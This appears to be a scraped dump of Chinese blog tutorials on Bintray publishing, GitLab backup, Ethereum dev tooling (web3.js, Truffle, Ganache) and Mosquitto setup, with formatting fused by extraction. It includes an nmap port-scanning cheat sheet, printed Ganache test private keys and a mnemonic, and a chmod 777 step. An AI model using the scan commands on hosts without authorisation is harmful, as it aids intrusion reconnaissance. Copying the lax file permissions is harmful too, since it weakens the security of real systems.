在最后一行加入以下内容12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879// 项目引用的版本号，比如 implementation &apos;com.kevinvane:demo:1.0.1&apos;group = &quot;com.kevinwen&quot;version = &quot;1.0.1&quot;def siteUrl = &apos;https://github.com/kevinvane/PageableLibrary&apos; // 项目主页。def gitUrl = &apos;git@github.com:kevinvane/PageableLibrary.git&apos; // Git仓库的url。install &#123; repositories.mavenInstaller &#123; pom &#123; project &#123; packaging &apos;aar&apos; //项目描述 name &apos;Pageable Library For Android&apos;// 可选，项目名称。 description &apos;The Android Pageable Library.&apos;// 可选，项目描述。 url siteUrl licenses &#123; license &#123; name &apos;The Apache Software License, Version 2.0&apos; url &apos;http://www.apache.org/licenses/LICENSE-2.0.txt&apos; &#125; &#125; //填写开发者基本信息，复制我的，这里需要修改。 developers &#123; developer &#123; id &apos;kevinenjoy &apos; // 开发者的id。 name &apos;Sam&apos; // 开发者名字。 email &apos;kevinwenwork@qq.com&apos; // 开发者邮箱。 &#125; &#125; scm &#123; connection gitUrl developerConnection gitUrl url siteUrl &#125; &#125; &#125; &#125;&#125;task sourcesJar(type: Jar) &#123; from android.sourceSets.main.java.srcDirs classifier = &apos;sources&apos;&#125;task javadoc(type: Javadoc) &#123; source = android.sourceSets.main.java.srcDirs classpath += project.files(android.getBootClasspath().join(File.pathSeparator)) failOnError false // 忽略注释语法错误，如果用jdk1.8你的注释写的不规范就编译不过。&#125;task javadocJar(type: Jar, dependsOn: javadoc) &#123; classifier = &apos;javadoc&apos; from javadoc.destinationDir&#125;artifacts &#123; archives javadocJar archives sourcesJar&#125;// 这里是读取Bintray相关的信息，我们上传项目到github上的时候会把gradle文件传上去，所以不要把帐号密码的信息直接写在这里，写在local.properties中，这里动态读取。Properties properties = new Properties()properties.load(project.rootProject.file(&apos;local.properties&apos;).newDataInputStream())bintray &#123; user = properties.getProperty(&quot;bintray.user&quot;) // Bintray的用户名。 key = properties.getProperty(&quot;bintray.apikey&quot;) // Bintray刚才保存的ApiKey。 configurations = [&apos;archives&apos;] pkg &#123; repo = &quot;maven&quot; name = &quot;PageableLibrary&quot;// 发布到Bintray上的项目名字，不是引用的名称 userOrg = user websiteUrl = siteUrl vcsUrl = gitUrl licenses = [&quot;Apache-2.0&quot;] publish = true &#125;&#125; 配置隐私信息以下两行是bintray的用户名称和apikey，这是很重要的信息，我们放在./local.properties文件保存12user = properties.getProperty(&quot;bintray.user&quot;) // Bintray的用户名。key = properties.getProperty(&quot;bintray.apikey&quot;) ./local.properties12bintray.user=kevinenjoybintray.apikey=xxxx 执行命令发布到 bintray12345$ ./gradlew install$ ./gradlew bintrayUploadBUILD SUCCESSFUL in 13s29 actionable tasks: 2 executed, 27 up-to-date 如果有 BUILD SUCCESSFUL提示信息，表示成功了，登录到 bintray 看一下maven仓库，发现我们的库已经发布上来了。目前为止，我们已经把库发布到了 bintray 发布到 jcenterJCenter是Android默认使用的仓库，登录到 bintray，进入库项目，单击 Add to JCenter 按钮，填一下简介信息，提交审核，审核通过就行了。 引用如果通过审核，直接引用就可以了 1implementation &apos;com.kevinwen:pageablelibrary:1.0.1@aar&apos; 没有通过审核一样可以用，只不过要指定repositories。 1234567891011121314buildscript &#123; repositories &#123; google() //指定maven仓库为我账号的maven账号 maven &#123; url &apos;https://dl.bintray.com/kevinenjoy/maven&apos; &#125; jcenter() &#125; dependencies &#123; classpath &apos;com.android.tools.build:gradle:3.1.2&apos; &#125;&#125; 注意：https://dl.bintray.com/kevinenjoy/maven 中的 kevinenjoy/maven就是我们配置项目的地址，其中kevinenjoy是我们的账号，maven是我们账号里面的maven仓库。 总结jcenter配置还是有点复杂的，而且编译提交容易出现错误，这时候有一个更加简单的仓库JitPack。JitPack不用本地做配置，只要将项目放在github上，release一个版本，将URL放在JitPack上可以了，是不是很方便？简单三步发布自己的开源库到JitPack","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/tags/Android/"}]},{"title":"gitlab备份恢复","slug":"git/gitlab备份恢复","date":"2018-06-13T11:52:36.000Z","updated":"2021-12-28T03:24:10.237Z","comments":true,"path":"git/gitlab备份恢复/","link":"","permalink":"http://yoursite.com/git/gitlab备份恢复/","excerpt":"","text":"备份1$ gitlab-rake gitlab:backup:create 备份文件在 /var/opt/gitlab/backups 目录下，如：1528882180_2018_06_13_10.5.5_gitlab_backup.tar。 备份过程中此目录会生成很多临时文件，比如数据库，如果由于空间不足导致备份失败，这个目录下的文件都可以删除释放空间，当然备份成功后，临时文件都会被清除。 迁移/恢复12$ chmod 777 1528882180_2018_06_13_10.5.5_gitlab_backup.tar$ gitlab-rake gitlab:backup:restore BACKUP=1560416966 注意：迁移的话要将老服务器/var/opt/gitlab/backups目录下的备份文件拷贝到新服务器上的/var/opt/gitlab/backups，如果迁移前后的gitlab版本不一致，会报如下错误，所以版本必须要一致。 定时备份可以写脚本定时执行备份，参考","categories":[{"name":"git","slug":"git","permalink":"http://yoursite.com/categories/git/"}],"tags":[]},{"title":"7.2、基于H5通过web3.js交易代币","slug":"区块链/7.2、基于H5通过web3.js交易代币","date":"2018-06-07T15:50:38.000Z","updated":"2018-12-02T14:50:00.000Z","comments":true,"path":"区块链/7.2、基于H5通过web3.js交易代币/","link":"","permalink":"http://yoursite.com/区块链/7.2、基于H5通过web3.js交易代币/","excerpt":"","text":"后来看到这篇文章 合约交互 摘录： 标准的与以太坊网络交互的方法是通过以太坊官方构建的Web3库。尽管这个库非常有用，但使用其提供接口与合约交互有些困难，特别是以太坊的新手。为降低学习曲线，Truffle使用Ether Pudding库，它也是基于Web3的基础之上，目的是为了让交互更简单。 环境基于《6.1、基于truffle框架部署完整合约(发布Token代币).md》的环境，启动Ganache-Gui，并且用truffle编译和部署好合约。 拷贝出 abi 和 合约地址 生成 合约实例，就可以通过 web3.js 调用合约的函数。 代码以下是js部分代码，其实就是一个空的html，只要引入web3.js就可以运行了。 js代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;script&gt; if (typeof web3 !== 'undefined') &#123; web3 = new Web3(web3.currentProvider); &#125; else &#123; // set the provider you want from Web3.providers web3 = new Web3(new Web3.providers.HttpProvider()); &#125; //合约的 abi 信息 var abi =[太长了，不写]; //合约的地址 var contractAddress = '0x78fa7e19c947457396b9300133e68a8783d5cc87'; var Mycontract = web3.eth.contract(abi).at(contractAddress); var coinbase = web3.eth.coinbase; Mycontract.totalSupply(function(error, result)&#123; if(!error)&#123; console.log(\"查询发行量:\"+result.toNumber()); &#125;else console.error(error); &#125;); var accout0 = '0x08b3142691c5cfbf78857cef6c971fffeb7b78cf'; Mycontract.balanceOf(accout0,function(error, result)&#123; if(!error)&#123; console.log(\"accout0 余额:\"+result.toNumber()); &#125;else console.error(error); &#125;); web3.eth.defaultAccount= coinbase; var toaddress = '0x3d2eed83e5ca9c254734c7c642ef1c805c07a40a'; Mycontract.balanceOf(toaddress,function(error, result)&#123; if(!error)&#123; console.log(\"accout1 余额:\"+result.toNumber()); &#125;else console.error(error); &#125;); web3.eth.defaultAccount= web3.eth.coinbase; var mon = '10000000000000000000'; if(web3.isAddress(toaddress))&#123; console.log(\"交易\"); Mycontract.transfer(toaddress, mon ,function(error, result)&#123; console.log(\"交易回调\"); if(!error)&#123; console.log(\"交易成功\"); console.log(\"transfer:\"+result); &#125;else&#123; console.log(\"交易错误\"); console.error(error); &#125; &#125;); &#125;else &#123; console.log(\"非法地址\"); &#125;&lt;/script&gt; 调用对应关系 12Mycontract.balanceOf 对应着合约上的函数 function balanceOf(address _owner)Mycontract.transfer 对应着合约上的函数 function transfer(address _to, uint256 _value) 运行结果分析 根据我们的合约，部署合约时的初始发行代币是存入到执行部署合约的账号下（默认是 accout[0]） Mycontract.transfer居然需要MetaMask确认交易（登录了accout[0]），这是什么情况，肯定哪里不对？退出登录就一直报错：invalid address MetaMask 登录了 accout[0] 确认提交交易之后，ganache-cli 打印以下log，但是币一直转不过去，MetaMask也一直提示错误Taking too long? Retry with a higher gas price here 123456#ganache-cli eth_sendRawTransactionTransaction: 0xc64173b80b34e946438d2502e778baf4a3af300d9c4cb0aebd74a5acb5c4f499Gas usage: 36511Block Number: 7Block Time: Fri Jun 08 2018 22:58:03 GMT+0800 (中国标准时间) 换一个浏览器打开该页面，成功打印以下log，看来MetaMask 影响了呀。 12345678#web控制台交易查询发行量:1e+22accout0 余额:9.98e+21accout1 余额:20000000000000000000交易回调交易成功transfer:0x7832f4c0c251ee2072d4f20619988436807589a9c4159385364b597b9d727836 至此已完成一个Demo。 基于以上代码，稍微改造一下，就实现了一个拨币的页面了 代码：tag v1.0 效果如图：","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"7.1、基于H5调用web3.js接口查询余额","slug":"区块链/7.1、基于H5调用web3.js接口查询余额","date":"2018-06-07T15:50:36.000Z","updated":"2018-12-02T14:40:00.000Z","comments":true,"path":"区块链/7.1、基于H5调用web3.js接口查询余额/","link":"","permalink":"http://yoursite.com/区块链/7.1、基于H5调用web3.js接口查询余额/","excerpt":"","text":"启动 ganache-gui打开就可以了 API目前(20180607) 还是0.xx(0.20.6)版的，1.0还没有发布。1&lt;script src=\"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js\"&gt;&lt;/script&gt; Documentation 初始化项目新建一个目录 ( 空的web工程 )，新建文件demoHello.html 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" &gt;&lt;head&gt; &lt;meta charset=\"UTF-8\" /&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;script src=\"https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js\"&gt;&lt;/script&gt; &lt;style&gt; .editext&#123; width: 50%; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt; &lt;div&gt; 输入服务地址：&lt;input class=\"editext\" id=\"host\" value=\"http://localhost:7545\"&gt; &lt;/div&gt; &lt;div&gt; 输入账号地址：&lt;input class=\"editext\" id=\"address\" value=\"0x1fdaA44143663f45C54b78c3cA4224Fc1Bb92c53\"&gt; &lt;/div&gt; &lt;p id=\"balance\" style=\"color:red\"&gt;刷新网页查询余额&lt;/p&gt;&lt;/div&gt;&lt;script&gt; var host = $(\"#host\").val(); var address = $(\"#address\").val(); var Web3 = require('web3'); var web3 = new Web3(); //default \"http://localhost:8545\" web3.setProvider(new web3.providers.HttpProvider(host)); var coinbase = web3.eth.coinbase; var originalBalance = web3.eth.getBalance(coinbase).toNumber(); console.log(coinbase); console.log(originalBalance); var version = web3.version.api; console.log(version); var version = web3.version.node; console.log(version); var mining = web3.eth.mining; console.log(\"节点是否挖矿：\"+mining); // true or false var accounts = web3.eth.accounts; console.log(accounts); var number = web3.eth.blockNumber; console.log(\"当前区块号:\"+number); var info = web3.eth.getBlock(number); console.log(\"区块\"+number + \"的信息：\"); console.log(info); var balance = web3.eth.getBalance(address); $(\"#balance\").html(\"余额：\"+balance); console.log(\"余额：\"+balance); // instanceof BigNumber console.log(\"余额stirng：\"+balance.toString(10)); // '1000000000000' console.log(\"余额number：\"+balance.toNumber()); // 1000000000000&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在浏览器打开demo.html，正常的话，会在控制台打印：","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"Nmap扫描端口常用命令","slug":"Web后端/nmap扫描端口常用命令","date":"2018-05-25T11:52:36.000Z","updated":"2021-12-28T03:24:10.215Z","comments":true,"path":"Web后端/nmap扫描端口常用命令/","link":"","permalink":"http://yoursite.com/Web后端/nmap扫描端口常用命令/","excerpt":"","text":"1234567891011121314151617# 默认$ sudo nmap 192.168.1.88# 检查指定端口范围$ sudo nmap -p1880-9002 192.168.1.88# 检查指定端口,多个用逗号隔开$ sudo nmap -p1883,9001 192.168.1.88# 迅速检查网站是否正常运行$ sudo nmap -sS 192.168.1.88# 检查在目标系统上运行的服务$ sudo nmap -sV 192.168.1.88# 检查目标系统的打开端口$ sudo nmap -vv 192.168.1.88","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nmap","slug":"nmap","permalink":"http://yoursite.com/tags/nmap/"}]},{"title":"Mosquitto从零部署","slug":"Web后端/mosquitto从零部署","date":"2018-05-24T11:52:36.000Z","updated":"2021-12-28T03:24:10.214Z","comments":true,"path":"Web后端/mosquitto从零部署/","link":"","permalink":"http://yoursite.com/Web后端/mosquitto从零部署/","excerpt":"","text":"环境全新的Ubuntu 16.04，所需编译环境： 1$ sudo apt-get install build-essential openssl libssl-dev libc-ares-dev uuid-dev cmake -y 安装libwebsockets12345678910111213141516171819$ wget https://warmcat.com/git/libwebsockets/snapshot/libwebsockets-3.0.0.tar.gz$ tar -zxvf libwebsockets-3.0.0.tar.gz$ cd libwebsockets-3.0.0$ mkdir build$ cd build$ cmake ..$ make$ sudo make install# 使库文件软链接立刻生效$ sudo ldconfig 安装mosquttio123456789101112131415161718192021222324$ wget https://mosquitto.org/files/source/mosquitto-1.5.tar.gz$ tar -zxvf mosquitto-1.5.tar.gz$ cd mosquitto-1.5/$ vim mosquitto.confport 1883protocol mqttlistener 9001protocol websockets$ vim config.mkWITH_WEBSOCKETS:=yes$ make$ sudo make install# 使库文件软链接立刻生效$ sudo ldconfig 启动1234567$ sudo mosquitto -c /etc/mosquitto/mosquitto.conf.example1527152208: mosquitto version 1.5 starting1527152208: Config loaded from /etc/mosquitto/mosquitto.conf.1527152208: Opening websockets listen socket on port 9001.1527152208: Opening ipv4 listen socket on port 1883.1527152208: Opening ipv6 listen socket on port 1883.$ sudo mosquitto -c /etc/mosquitto/mosquitto.conf.example -d (守护进程) 用户123456789$ sudo vim /etc/mosquitto/mosquitto.confallow_anonymous falsepassword_file /etc/mosquitto/pwfile.conf# -c 表示覆盖创建用户， pwfile会被清空$ sudo mosquitto_passwd -c /etc/mosquitto/pwfile.conf admin#输入两次密码$ sudo mosquitto_passwd /etc/mosquitto/pwfile.conf test 更多配置参考 授权插件如上手动添加用户在生产环境不太现实，接下来将通过HTTP插件实现用户授权管理。 12345678910111213141516171819202122232425262728293031$ git clone https://github.com/jpmens/mosquitto-auth-plug.git$ cd mosquitto-auth-plug$ cp config.mk.in config.mk$ vim config.mk# 打开HTTP授权的方式BACKEND_HTTP ?= yes# mosquitto 源码的路径MOSQUITTO_SRC = /home/root/mosquitto-1.5$ make# 如果报错 fatal error: curl/curl.h: No such file or directory# 安装libcurl4-openssl-dev$ sudo apt-get install libcurl4-openssl-dev# 将编译好的so文件和 mosquitto 放在一起$ cp auth-plug.so /usr/local/sbin/$ vim /etc/mosquitto/mosquitto.conf#password_file /etc/mosquitto/pwfile.confauth_plugin /usr/local/sbin/auth-plug.soauth_opt_backends httpauth_opt_http_ip 192.168.5.33auth_opt_http_port 8089auth_opt_http_getuser_uri /authauth_opt_http_superuser_uri /superuserauth_opt_http_aclcheck_uri /acl# 重启 mosquitto 安装完成插件之后，只要编写授权的 HTTP服务，响应插件发起的授权请求，通过响应码返回结果就OK了。除了HTTP，还可以通过MySQL/Redis等数据库来实现。","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"Letsencrypt证书脚本acme.sh","slug":"Web后端/Letsencrypt证书脚本","date":"2018-05-22T01:52:36.000Z","updated":"2021-12-28T03:24:10.203Z","comments":true,"path":"Web后端/Letsencrypt证书脚本/","link":"","permalink":"http://yoursite.com/Web后端/Letsencrypt证书脚本/","excerpt":"","text":"acme.sh 可以从 letsencrypt 生成免费的证书,自动更新.","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"6.1、基于truffle发布Token到测试私链","slug":"区块链/6.1、基于truffle发布Token到测试私链","date":"2018-05-15T15:52:37.000Z","updated":"2018-12-02T14:30:00.000Z","comments":true,"path":"区块链/6.1、基于truffle发布Token到测试私链/","link":"","permalink":"http://yoursite.com/区块链/6.1、基于truffle发布Token到测试私链/","excerpt":"","text":"在上一篇文章《6、基于truffle框架部署合约》中，我们已经实现了部署一个简单的合约（sayhello和add），并且在控制台可以调用合约的函数。 本文将使用 《5.1、基于Ganache-Cli用Remix发布Token(代币)》 中sol代码，编译一个比较完整的合约，部署。 修改工程配置 sol代码加入到工程 修改 1_initial_migration.js文件 123456789101112var Token = artifacts.require(\"./Token.sol\");var StandardToken = artifacts.require(\"./StandardToken.sol\");var TeaToken = artifacts.require(\"./TeaToken.sol\");module.exports = function(deployer) &#123; deployer.deploy(Migrations); deployer.deploy(Token); deployer.deploy(StandardToken); //四个参数，是TeaToken的构造函数参数。 deployer.deploy(TeaToken,\"10000000000000000000000\",\"BBCoin\",18,\"BBC\");&#125;; TeaToken的构造函数 1234567891011121314151617181920function TeaToken( uint256 _initialAmount, //发行量 string _tokenName, //token名称 uint8 _decimalUnits, //小数位 string _tokenSymbol //标识 ) &#123; // Give the creator all initial tokens balances[msg.sender] = _initialAmount; // Update total supply totalSupply = _initialAmount; // Set the name for display purposes name = _tokenName; // Amount of decimals for display purposes decimals = _decimalUnits; // Set the symbol for display purposes symbol = _tokenSymbol; &#125; 编译部署123456789101112131415161718192021$ truffle compile$$ truffle migrate --resetUsing network 'development'.Running migration: 1_initial_migration.js Replacing Migrations... ... 0x026473e96e19f2a0a32bc787a9cd5ef7c29cab71e5517e803c29b18d6cb08070 Migrations: 0xe70fc286df987d4eace8dc486cc5492c950e50c6 Deploying Token... ... 0xf503e2b6663ade73b5a60ff7f6b82f6f1e87b07e2629bf5fad6a7bc654cb807b Token: 0x75aa2709dcee2bcd4fcc530924e0fb90e83a58f5 Deploying StandardToken... ... 0x4385d77ebae77be6efe0b65cf925f40bfaa0e0f518518745a4813d92204c2271 StandardToken: 0x2e6487e4d995dbba857362c7a0542bb76a6f11ae Deploying TeaToken... ... 0x3687702e5287e22cafd2d6ae3e41d0c3455b1306bca805541b2de174c5841a70 TeaToken: 0x6b528b7717777a90f4db0a96be268fc91610be35Saving successful migration to network... ... 0x374db95d4ff26b0f9a817fd48dfa2e648193333091a92fb001c6338b9f2b49eeSaving artifacts... 成功了，记下合约地址：TeaToken: 0x6b528b7717777a90f4db0a96be268fc91610be35","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"6.0、基于truffle部署HelloWorld合约到私链","slug":"区块链/6.0、基于truffle部署HelloWorld合约到私链","date":"2018-05-15T15:52:36.000Z","updated":"2018-12-02T14:20:00.000Z","comments":true,"path":"区块链/6.0、基于truffle部署HelloWorld合约到私链/","link":"","permalink":"http://yoursite.com/区块链/6.0、基于truffle部署HelloWorld合约到私链/","excerpt":"","text":"后来发现 文档翻译系列-Truffle框架 文章，摘录： Truffle是针对基于以太坊的Solidity语言的一套开发框架。本身基于Javascript。 Truffle官方文档-英文 Truffle官方文档-中文版 Truffle中文文档-深入浅出区块链 依赖环境 nodejs npm 启动 ganache-cli 或者 ganache-gui12#本文采用 cli$ ganache-cli 安装truffle环境12$ npm install -g solc-js$ npm install -g truffle 指定版本12$ npm install -g solc-js@0.5.0$ npm install -g truffle@5.0.24 注意：在Ubuntu下安装truffle ，很容易出现 Error: EACCES: permission denied，怎么修改文件的目录权限都不行，这个是npm的错误，可以增加以下参数执行：1$ sudo npm install -g truffle@5.0.24 --unsafe-perm=true --allow-root 1234$ truffle versionTruffle v5.0.24 (core: 5.0.24)Solidity v0.5.0 (solc-js)Node v8.10.0 初始化项目123456789101112131415161718192021222324$ mkdir demo$ cd demo$ truffle initDownloading...Unpacking...Setting up...Unbox successful. Sweet!Commands: Compile: truffle compile Migrate: truffle migrate Test contracts: truffle test$ tree.├── contracts│ └── Migrations.sol├── migrations│ └── 1_initial_migration.js├── test├── truffle-config.js└── truffle.js3 directories, 4 files 配置配置使用本地的 ganache-cli 测试网络 truffle.js 123456789module.exports = &#123; networks: &#123; development: &#123; host: 'localhost', port: '8545', //cli默认端口是8545，gui默认7545 network_id: '*' // Match any network id &#125; &#125; &#125;; 可以配置多个网络 编写合约代码Hello.sol1234567891011pragma solidity ^0.4.17;contract Hello&#123; function sayhello() public constant returns (string name)&#123; return (\"Hello World\"); &#125; function add(uint a,uint b) public returns (uint c)&#123; return a + b; &#125;&#125; 1_initial_migration.js 配置编译部署合约123456789var Migrations = artifacts.require(\"./Migrations.sol\");var Hello = artifacts.require(\"./Hello.sol\");module.exports = function(deployer) &#123; deployer.deploy(Migrations); deployer.deploy(Hello);&#125;; 编译和部署123456789101112131415$ truffle compile$ truffle migrateUsing network &apos;development&apos;.Running migration: 1_initial_migration.js Deploying Migrations... ... 0x430463c5f02367d3c00a0eb3facab3be1578aadcb770858e0ce767818fb6485a Migrations: 0xcb5f27c8d6f01dba2fef4444b0b838aa8af5288a Deploying Hello... ... 0xf9316b965d67db613c6c85fff4cfa647701db396648ef3a1f9ce76b4c05c7b7e Hello: 0x13369cf35bb4b60bb1bbd35f4413729d56490a6dSaving successful migration to network... ... 0x5af709894fad67a85f766f8ec61ad6377d4c62cd5c058b4e49d201d3b59fadaaSaving artifacts... ganache-cli 控制台的log（发生了2笔交易。）：123456789101112131415161718192021eth_sendTransaction Transaction: 0xf9316b965d67db613c6c85fff4cfa647701db396648ef3a1f9ce76b4c05c7b7e Contract created: 0x13369cf35bb4b60bb1bbd35f4413729d56490a6d Gas usage: 162663 Block Number: 7 Block Time: Tue May 15 2018 17:32:11 GMT+0800 (中国标准时间)eth_newBlockFiltereth_getFilterChangeseth_getTransactionReceipteth_getCodeeth_uninstallFiltereth_sendTransaction Transaction: 0x5af709894fad67a85f766f8ec61ad6377d4c62cd5c058b4e49d201d3b59fadaa Gas usage: 42008 Block Number: 8 Block Time: Tue May 15 2018 17:32:11 GMT+0800 (中国标准时间)eth_getTransactionReceipt 成功之后，build/contracts目录下都是json文件，它就是合约的元数据，我们要与合约进行交互就是用到其中的abi和address。 修改合约编译过的合约，如果版本没变，不会再次migrate，所以修改合约代码要重新 migrate。 truffle migrate --reset 测试123$ truffle testUsing network &apos;development&apos;. 0 passing (1ms) ganache-cli 控制台的log：1234567891011121314151617 Transaction: 0xd72b2538ee2e7770a7d3695cc233908c16d0eb9c96be9aab69d31a837238d4f6 Contract created: 0xbf3f89e5e3635467a899f86b532ba8d4329a9d5a Gas usage: 277462 Block Number: 4 Block Time: Tue May 15 2018 16:24:06 GMT+0800 (中国标准时间)eth_newBlockFiltereth_getFilterChangeseth_getTransactionReceipteth_getCodeeth_uninstallFiltereth_sendTransaction Transaction: 0xcf3ed3d31914eb20ba731646abe4b6c025316332aa487924922fad1eee9b52c3 Gas usage: 42008 Block Number: 5 Block Time: Tue May 15 2018 16:24:06 GMT+0800 (中国标准时间) 用truffle控制台与合约函数交互合约部署好了，就用使用它，调用他的函数以下操作参考了这篇文章 1Hello.deployed().then(instance =&gt; contract = instance) Hello.deployed().then 语句来取得 Hello 合约的 Instance （实例），并存到 contract 变量中，以方便后续的调用。 1234567891011121314151617181920212223242526272829$ truffle consoletruffle(development)&gt; Hello.deployed().then(instance =&gt; contract = instance)......很多打印......truffle(development)&gt; contract.sayhello()&apos;Hello World&apos;truffle(development)&gt; truffle(development)&gt; contract.add(1,44)&#123; tx: &apos;0x00724f11eaafd9eaa52315fb752aa935e75bad6c6a9ea654449874036dee23fc&apos;, receipt: &#123; transactionHash: &apos;0x00724f11eaafd9eaa52315fb752aa935e75bad6c6a9ea654449874036dee23fc&apos;, transactionIndex: 0, blockHash: &apos;0x31025dac9c6dc90aa1559e37002b174b15e86301cdab64607ba4f55e32234b7a&apos;, blockNumber: 10, gasUsed: 21976, cumulativeGasUsed: 21976, contractAddress: null, logs: [], status: &apos;0x01&apos;, logsBloom: &apos;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&apos; &#125;, logs: [] &#125; 通常来说，写数据被称作交易(transaction)，读数据被称作调用(call) sayhello() 方法返回字符，不需要 gas（call） 。 add() 方法会改变数据在区块链上的状态，需要花费 gas （transaction）； 扩展官方的示例项目：宠物商店官方的示例项目：宠物商店（中文翻译）官方的示例项目：宠物商店（中文翻译:旧）","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"5.1、基于Ganache-Cli用Remix发布Token(代币)","slug":"区块链/5.1、基于Ganache-Cli用Remix发布Token(代币)","date":"2018-05-15T14:52:36.000Z","updated":"2018-12-02T14:10:00.000Z","comments":true,"path":"区块链/5.1、基于Ganache-Cli用Remix发布Token(代币)/","link":"","permalink":"http://yoursite.com/区块链/5.1、基于Ganache-Cli用Remix发布Token(代币)/","excerpt":"","text":"本文启动 ganache-cli 1234567891011121314151617181920212223242526272829303132333435$ ganache-cliGanache CLI v6.1.0 (ganache-core: 2.1.0)Available Accounts==================(0) 0xef1e0310ecf99c3808940d351b8a4bd7566d0a71(1) 0xa91b4c17ff43421754a8b721a8e55ac2881d946b(2) 0x0a6d612ce9d06ee9bced7395f29b0167e059207e(3) 0xd64f06e3a98a41bea2a6fa290e742083206ee061(4) 0xd315be81ca72314a2434df898fe962e6b53db337(5) 0xd4b54a13c047214bfae17ee2e25bbe4891edf582(6) 0x630b76b384c423c231bbc3384b1333369296eff9(7) 0x5f10c0cc0a914d9e5711a4ae022c27f4be7013d4(8) 0xd7c06d6f55c44125a11d7d203bb24c86f786b37d(9) 0x2fc8126d7ea755089dc7337fe956f2f0369a205bPrivate Keys==================(0) 82d925b9235dcf17d2e7cb0907084bf44fa9ce7ab31a9d2375b5db75e2da0509(1) 3f02535f00fa0ab48c306e561491cb4e10c684cea0297ec23aa4e87322108723(2) a0c830651cac356ce0a1a1d471ae0a77d2f0cfbb869dbd2d7650d4827becf879(3) 60a0a77161316406a5c03453d9e85427357f4046939bd4f884561cc806a4dccf(4) 7914c24a44119f21071b2a7da59a4b07a8c665475b995e0491bf62e7b1cc0403(5) bc512c5af4b68021be1ea084e93acf87fd3c1dea4a3ad1eec60cc0ba408f5ac0(6) 2f1831f2ab30d0b091a4dced5dcac68c79fad0352727a5ab4edd694c3a9d4bd7(7) 963d08d6060e01eb9223e742f12955daf00f5cc54220001ce75353a50a017968(8) e3d724fa1a859afda107e9be2e3b0d5703705436bae1057280b8363bc6929fd8(9) 6a661a59913f97e6fbd9cc4d56e8fc4d6c098d7be14254d788a5917cfe498bfdHD Wallet==================Mnemonic: penalty until vessel limit motor waste rule ability soft moral stem harshBase HD Path: m/44&apos;/60&apos;/0&apos;/0/&#123;account_index&#125;Listening on localhost:8545 编译合约打开remix，一样编译三个sol代码文件（参考上文）。 部署合约Environment 选择 JavaScript VM 代表所有资料都是存在本地。它会提供 5 个虚拟账户每个有 100 ETH，随便选择一个账户accout[0]部署合约，一个账户accout[1]作为收账。 账号地址 1230xca35b7d915458ef540ade6068dfe2f44e8fa733c0x14723a09acff6d2a60dcdf7aa4aff308fddc160c 部署参数1&quot;10000000000000000000000&quot;,&quot;GGCoin&quot;,18,&quot;GG&quot; 部署示例 部署成功，自动显示我们的合约 同时在log上点开扩展可以看到显示的debug信息 转账 accout[0] -&gt; accout[1] 转10个GG币 1&quot;0x14723a09acff6d2a60dcdf7aa4aff308fddc160c&quot;,&quot;10000000000000000000&quot; log信息 查询accout[1]余额：10个GG币 已上文章都是通过 Remix 在线部署合约的，接下来就要通过Truffle框架来实现了。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"5.0、搭建Ganache测试私链环境","slug":"区块链/5.0、搭建Ganache和Ganache-Cli测试私链环境","date":"2018-05-15T14:51:36.000Z","updated":"2018-12-02T14:00:00.000Z","comments":true,"path":"区块链/5.0、搭建Ganache和Ganache-Cli测试私链环境/","link":"","permalink":"http://yoursite.com/区块链/5.0、搭建Ganache和Ganache-Cli测试私链环境/","excerpt":"","text":"与 Ropsten Test Net 一样，现在我们在私有链发布一个Token，私有链前面使用了Geth来实现，本文通过 ganache来作为本地测试私有链。ganache 是一个基于内存的以太坊链，用于本地测试，安装简单，不用去连接测试网络，省去同步以太坊区块的麻烦。 最关键是为后面的truffle框架做铺垫。 安装运行 ganache 是GUI程序。（需要nodejs环境） 下载地址 https://github.com/trufflesuite/ganache/releases 支持Linux、Mac和Windows ，本文直接安装Windows的，启动就可以，运行后默认创建10个账号，每个账号里有100ETH的余额。 默认是127.0.0.1，只有本地能访问，修改为WLAN局域网内可以访问。 ganache-cli 是字符终端程序（需要nodejs环境） 123456789101112131415161718192021222324252627282930313233343536$ npm install -g ganache-cli$ ganache-cliGanache CLI v6.1.0 (ganache-core: 